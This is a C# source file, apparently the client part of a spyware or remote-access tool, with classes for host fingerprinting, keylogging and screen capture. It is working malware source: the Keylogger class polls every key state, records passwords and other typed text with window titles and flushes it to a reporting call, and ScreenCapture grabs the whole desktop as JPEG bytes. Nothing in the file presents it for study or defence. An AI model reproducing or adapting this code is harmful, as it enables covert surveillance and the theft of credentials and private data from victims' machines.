using System;
using System.Text;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Management;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Collections;

namespace Client
{
    public static class HostIdentification
    {
        
        public static string GetLocalIP()
        {
            try
            {
                string IPReturns = "";
                foreach (IPAddress Address in System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName()).AddressList)
                {
                    IPReturns += Address.ToString() + Environment.NewLine;

                }
                return IPReturns;
            }
            catch (Exception ex)
            {
                return "Error GetLocalIP" + ex.ToString();
            }
        }

        public static string GetMachinename()
        {
            try
            {
                return Environment.MachineName.ToString();
            }
            catch (Exception ex)
            {
                return "Error GetMachinename" + ex.ToString();
            }
        }

        public static string GetMachineOS()
        {
            try
            {
                return Environment.OSVersion.ToString();
            }
            catch (Exception ex)
            {
                return "Error GetMachineOS" + ex.ToString();
            }
        }

        public static string GetMacAddr()
        {
            try
            {
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                //for each j you can get the MAC
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up)
                    {
                        return nic.GetPhysicalAddress().ToString();
                    }
                }
                return "";
            }
            catch (Exception ex)
            {
                return "Error GetMacAddr" + ex.ToString();
            }

        }

        public static string GetActiveUser()
        {
            try
            {
                return Environment.UserName;
            }
            catch (Exception ex)
            {
                return "Error GetActiveUser" + ex.ToString();
            }

        }

        public static string fingerPrint = string.Empty;

        public static string GetFingerPrint()
        {
            try
            {
                if (string.IsNullOrEmpty(fingerPrint))
                {
                    fingerPrint = GetHash(GetCPUID() + GetHDDUID());
                }
                return fingerPrint;
            }
            catch (Exception ex)
            {
                return "Error GetFingerPrint" + ex.ToString();
            }
        }

        private static string GetHash(string s)
        {
            MD5 sec = new MD5CryptoServiceProvider();
            ASCIIEncoding enc = new ASCIIEncoding();
            byte[] bt = enc.GetBytes(s);
            return GetHexString(sec.ComputeHash(bt));
        }

        private static string GetHexString(byte[] bt)
        {
            string s = string.Empty;
            for (int i = 0; i < bt.Length; i++)
            {
                byte b = bt[i];
                int n, n1, n2;
                n = (int)b;
                n1 = n & 15;
                n2 = (n >> 4) & 15;
                if (n2 > 9)
                    s += ((char)(n2 - 10 + (int)'A')).ToString();
                else
                    s += n2.ToString();
                if (n1 > 9)
                    s += ((char)(n1 - 10 + (int)'A')).ToString();
                else
                    s += n1.ToString();
                if ((i + 1) != bt.Length && (i + 1) % 2 == 0) s += "-";
            }
            return s;
        }

        private static string GetCPUID()
        {
            string cpuInfo = string.Empty;
            ManagementClass mc = new ManagementClass("win32_processor");
            ManagementObjectCollection moc = mc.GetInstances();

            foreach (ManagementObject mo in moc)
            {
                if (cpuInfo == "")
                {
                    //Get only the first CPU's ID
                    cpuInfo = mo.Properties["processorID"].Value.ToString();
                    break;
                }
            }
            return cpuInfo;
        }

        private static string GetHDDUID()
        {
            var logicalDiskId = "C:";
            var deviceId = string.Empty;

            var query = "ASSOCIATORS OF {Win32_LogicalDisk.DeviceID='" + logicalDiskId + "'} WHERE AssocClass = Win32_LogicalDiskToPartition";
            var queryResults = new ManagementObjectSearcher(query);
            var partitions = queryResults.Get();

            foreach (var partition in partitions)
            {
                query = "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" + partition["DeviceID"] + "'} WHERE AssocClass = Win32_DiskDriveToDiskPartition";
                queryResults = new ManagementObjectSearcher(query);
                var drives = queryResults.Get();

                foreach (var drive in drives)
                    deviceId = drive["DeviceID"].ToString();
            }
            return deviceId;
        }
        
        
    }
    public class Keylogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();
        public bool started = false;
        private System.String keyBuffer;
        private System.Timers.Timer timerKeyMine;
        private System.Timers.Timer timerBufferFlush;
        private System.String hWndTitle;
        private System.String hWndTitlePast;
        private bool tglAlt = false;
        private bool tglControl = false;
        private bool tglCapslock = false;

        public void KeyloggerStart()
        {
            hWndTitle = ActiveApplTitle();
            hWndTitlePast = hWndTitle;

            //
            // keyBuffer
            //
            keyBuffer = "";

            // 
            // timerKeyMine
            // 
            this.timerKeyMine = new System.Timers.Timer();
            this.timerKeyMine.Enabled = true;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this.timerKeyMine.Interval = 10;// nese shtyp shpejt 10 milisec


            // 
            // timerBufferFlush
            //
            this.timerBufferFlush = new System.Timers.Timer();
            this.timerBufferFlush.Enabled = true;
            this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
            this.timerBufferFlush.Interval = 12000; // 2 min
            started = true;
        }

        public void KeyLogerStop()
        {
            
            timerKeyMine.Stop();
            timerKeyMine.Dispose();
            timerBufferFlush.Stop();
            timerBufferFlush.Dispose();
            Flush2File();
            Program.A.RegisterValue(Program.myName, "KeyLog Stop! " , "Stop -" + DateTime.Now.ToString());
            started = false;
        }

        public static string ActiveApplTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder sbTitle = new StringBuilder(1024);
            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
            if ((intLength <= 0) || (intLength > sbTitle.Length)) return "unknown";
            string title = sbTitle.ToString();
            return title;
        }

        private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            hWndTitle = ActiveApplTitle();

            if (hWndTitle != hWndTitlePast)
            {
                keyBuffer += "[" + hWndTitle + "]" + Environment.NewLine;
                hWndTitlePast = hWndTitle;
            }

            foreach (System.Int32 i in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    //Console.WriteLine(i.ToString()); // Outputs the pressed key code [Debugging purposes]


                    if (ControlKey)
                    {
                        if (!tglControl)
                        {
                            tglControl = true;
                            keyBuffer += "<Ctrl=On>";
                        }
                    }
                    else
                    {
                        if (tglControl)
                        {
                            tglControl = false;
                            keyBuffer += "<Ctrl=Off>";
                        }
                    }

                    if (AltKey)
                    {
                        if (!tglAlt)
                        {
                            tglAlt = true;
                            keyBuffer += "<Alt=On>";
                        }
                    }
                    else
                    {
                        if (tglAlt)
                        {
                            tglAlt = false;
                            keyBuffer += "<Alt=Off>";
                        }
                    }

                    if (CapsLock)
                    {
                        if (!tglCapslock)
                        {
                            tglCapslock = true;
                            keyBuffer += "<CapsLock=On>";
                        }
                    }
                    else
                    {
                        if (tglCapslock)
                        {
                            tglCapslock = false;
                            keyBuffer += "<CapsLock=Off>";
                        }
                    }

                    if (Enum.GetName(typeof(Keys), i) == "LButton")
                        keyBuffer += "<LMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
                        keyBuffer += "<RMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "Back")
                        keyBuffer += "<Backspace>";
                    else if (Enum.GetName(typeof(Keys), i) == "Space")
                        keyBuffer += " ";
                    else if (Enum.GetName(typeof(Keys), i) == "Return")
                        keyBuffer += "<Enter>";
                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
                        keyBuffer += "<Del>";
                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
                        keyBuffer += "<Ins>";
                    else if (Enum.GetName(typeof(Keys), i) == "Home")
                        keyBuffer += "<Home>";
                    else if (Enum.GetName(typeof(Keys), i) == "End")
                        keyBuffer += "<End>";
                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
                        keyBuffer += "<Tab>";
                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
                        keyBuffer += "<Page Up>";
                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
                        keyBuffer += "<Page Down>";
                    else if (Enum.GetName(typeof(Keys), i) == "LWin" || Enum.GetName(typeof(Keys), i) == "RWin")
                        keyBuffer += "<Win>";

                    /* ********************************************** *
                     * Detect key based off ShiftKey Toggle
                     * ********************************************** */
                    if (ShiftKey)
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)i;
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "!";
                        else if (i.ToString() == "50")
                            keyBuffer += "@";
                        else if (i.ToString() == "51")
                            keyBuffer += "#";
                        else if (i.ToString() == "52")
                            keyBuffer += "$";
                        else if (i.ToString() == "53")
                            keyBuffer += "%";
                        else if (i.ToString() == "54")
                            keyBuffer += "^";
                        else if (i.ToString() == "55")
                            keyBuffer += "&";
                        else if (i.ToString() == "56")
                            keyBuffer += "*";
                        else if (i.ToString() == "57")
                            keyBuffer += "(";
                        else if (i.ToString() == "48")
                            keyBuffer += ")";
                        else if (i.ToString() == "192")
                            keyBuffer += "~";
                        else if (i.ToString() == "189")
                            keyBuffer += "_";
                        else if (i.ToString() == "187")
                            keyBuffer += "+";
                        else if (i.ToString() == "219")
                            keyBuffer += "{";
                        else if (i.ToString() == "221")
                            keyBuffer += "}";
                        else if (i.ToString() == "220")
                            keyBuffer += "|";
                        else if (i.ToString() == "186")
                            keyBuffer += ":";
                        else if (i.ToString() == "222")
                            keyBuffer += "\"";
                        else if (i.ToString() == "188")
                            keyBuffer += "<";
                        else if (i.ToString() == "190")
                            keyBuffer += ">";
                        else if (i.ToString() == "191")
                            keyBuffer += "?";
                    }
                    else
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)(i + 32);
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "1";
                        else if (i.ToString() == "50")
                            keyBuffer += "2";
                        else if (i.ToString() == "51")
                            keyBuffer += "3";
                        else if (i.ToString() == "52")
                            keyBuffer += "4";
                        else if (i.ToString() == "53")
                            keyBuffer += "5";
                        else if (i.ToString() == "54")
                            keyBuffer += "6";
                        else if (i.ToString() == "55")
                            keyBuffer += "7";
                        else if (i.ToString() == "56")
                            keyBuffer += "8";
                        else if (i.ToString() == "57")
                            keyBuffer += "9";
                        else if (i.ToString() == "48")
                            keyBuffer += "0";
                        else if (i.ToString() == "189")
                            keyBuffer += "-";
                        else if (i.ToString() == "187")
                            keyBuffer += "=";
                        else if (i.ToString() == "92")
                            keyBuffer += "`";
                        else if (i.ToString() == "219")
                            keyBuffer += "[";
                        else if (i.ToString() == "221")
                            keyBuffer += "]";
                        else if (i.ToString() == "220")
                            keyBuffer += "\\";
                        else if (i.ToString() == "186")
                            keyBuffer += ";";
                        else if (i.ToString() == "222")
                            keyBuffer += "'";
                        else if (i.ToString() == "188")
                            keyBuffer += ",";
                        else if (i.ToString() == "190")
                            keyBuffer += ".";
                        else if (i.ToString() == "191")
                            keyBuffer += "/";
                    }
                }
            }
        }

        #region toggles
        public static bool ControlKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); }
        } // ControlKey
        public static bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000); }
        } // ShiftKey
        public static bool CapsLock
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000); }
        } // CapsLock
        public static bool AltKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); }
        } // AltKey
        #endregion

        private void timerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (keyBuffer.Length > 0)
                Flush2File();
        }

        public void Flush2File()
        {
                string file = "";
                try
                {
                    file += "_" + DateTime.Now.ToString("MM.dd.yyyy");
                    if (keyBuffer != "")
                    {
                        Program.A.RegisterValue(Program.myName, "KeyLog " + file, keyBuffer);
                    }
                    keyBuffer = ""; // reset
                }
                catch (Exception ex)
                {
                    
                }
        }
    }
    public static class ScreenCapture
    {

        public static bool BW = true;
        public static Image MakeGrayscale3(Image original)
        {
            //create a blank bitmap the same size as original


            //get a graphics object from the new image
            Graphics g = Graphics.FromImage(original);

            //create the grayscale ColorMatrix
            ColorMatrix colorMatrix = new ColorMatrix(
               new float[][] 
              {
                 new float[] {.3f, .3f, .3f, 0, 0},
                 new float[] {.59f, .59f, .59f, 0, 0},
                 new float[] {.11f, .11f, .11f, 0, 0},
                 new float[] {0, 0, 0, 1, 0},
                 new float[] {0, 0, 0, 0, 1}
              });

            //create some image attributes
            ImageAttributes attributes = new ImageAttributes();

            //set the color matrix attribute
            attributes.SetColorMatrix(colorMatrix);

            //draw the original image on the new image
            //using the grayscale color matrix
            g.DrawImage(original, new Rectangle(0, 0, original.Width, original.Height),
               0, 0, original.Width, original.Height, GraphicsUnit.Pixel, attributes);

            //dispose the Graphics object
            g.Dispose();
            return original;
        }

        public static byte[] imageToByteArray(System.Drawing.Image imageIn)
        {
            if (imageIn != null)
            {
                MemoryStream ms = new MemoryStream();
                imageIn.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                return ms.ToArray();
            }
            else
            {
                return new byte[0];
            }
        }

        public static byte[] CaptureScreen()
        {
            

            if (BW)
            { return imageToByteArray( MakeGrayscale3(CaptureWindow(User32.GetDesktopWindow()))); }
            else
            { return imageToByteArray( CaptureWindow(User32.GetDesktopWindow()) ); }

        }
        public static Image CaptureWindow(IntPtr handle)
        {
            // get te hDC of the target window
            IntPtr hdcSrc = User32.GetWindowDC(handle);
            // get the size
            User32.RECT windowRect = new User32.RECT();
            User32.GetWindowRect(handle, ref windowRect);
            int width = windowRect.right - windowRect.left;
            int height = windowRect.bottom - windowRect.top;
            // create a device context we can copy to
            IntPtr hdcDest = GDI32.CreateCompatibleDC(hdcSrc);
            // create a bitmap we can copy it to,
            // using GetDeviceCaps to get the width/height
            IntPtr hBitmap = GDI32.CreateCompatibleBitmap(hdcSrc, width, height);
            // select the bitmap object
            IntPtr hOld = GDI32.SelectObject(hdcDest, hBitmap);
            // bitblt over
            GDI32.BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, GDI32.SRCCOPY);
            // restore selection
            GDI32.SelectObject(hdcDest, hOld);
            // clean up
            GDI32.DeleteDC(hdcDest);
            User32.ReleaseDC(handle, hdcSrc);
            // get a .NET image object for it
            Image img = Image.FromHbitmap(hBitmap);
            // free up the Bitmap object
            GDI32.DeleteObject(hBitmap);
            return img;
        }
        private class GDI32
        {

            public const int SRCCOPY = 0x00CC0020; // BitBlt dwRop parameter
            [DllImport("gdi32.dll")]
            public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest,
                int nWidth, int nHeight, IntPtr hObjectSource,
                int nXSrc, int nYSrc, int dwRop);
            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth,
                int nHeight);
            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
            [DllImport("gdi32.dll")]
            public static extern bool DeleteDC(IntPtr hDC);
            [DllImport("gdi32.dll")]
            public static extern bool DeleteObject(IntPtr hObject);
            [DllImport("gdi32.dll")]
            public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);
        }
        private class User32
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct RECT
            {
                public int left;
                public int top;
                public int right;
                public int bottom;
            }
            [DllImport("user32.dll")]
            public static extern IntPtr GetDesktopWindow();
            [DllImport("user32.dll")]
            public static extern IntPtr GetWindowDC(IntPtr hWnd);
            [DllImport("user32.dll")]
            public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);
            [DllImport("user32.dll")]
            public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);
        }
    }

}
